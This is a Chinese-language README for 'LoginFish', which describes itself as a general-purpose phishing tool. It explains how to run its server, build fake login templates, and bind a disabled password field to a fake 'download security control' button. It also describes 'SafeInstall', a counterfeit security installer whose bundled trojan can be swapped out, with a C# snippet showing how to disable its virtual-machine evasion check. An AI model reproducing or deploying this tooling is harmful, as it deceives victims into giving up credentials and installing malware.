# LoginFish 通用钓鱼工具


![index](/images/index.png)
![admin](/images/admin.png)
![admin2](/images/index2.png)
![admin3](/images/index3.png)

## 使用方法


```
# 后台登录密码,请修改 password.txt 

./LoginFish port
./LoginFish 80

```

## 模板修改

打开`static/template/`目录,默认有俩个模板,分别是`front_login_1.html`和`front_login.html`

如果需要`css`和`js`文件则把其放在`static/dist`中

模板中使用`<script src="/static/dist/login.js"></script>` 这样的路径进行引用

如果需要自定义模板,则在`static/template/`中创建以`front_`开头的html文件即可.

然后需要引用`<script src="/static/dist/login.js"></script>` 文件,再把某个下载按钮绑定到`onclick_input`事件即可

```js
 <div onclick="onclick_input()">
        <label for="password">密码</label>
        <input name="password" class="password" type="password" disabled placeholder="下载安全控件" id="password">
 </div>
```

或者你也可以直接使用`<a href='/down'>下载</a>` 这样的方式去绑定下载地址.

## SafeInstall 模拟安全控件

使用`Visual Studio 14`开发,替换木马需要修改资源文件中的`load`

如果需要关闭屏蔽虚拟机,则编辑`SafeInstall/SafeInstall/Form1.cs`文件

```c#
public Form1()
{
    checkVM(); //注释该行即可
    writeFile();
    InitializeComponent();
    progressBar1.Value = 0;
    timer1.Interval = 50;
    timer1.Start();
}
```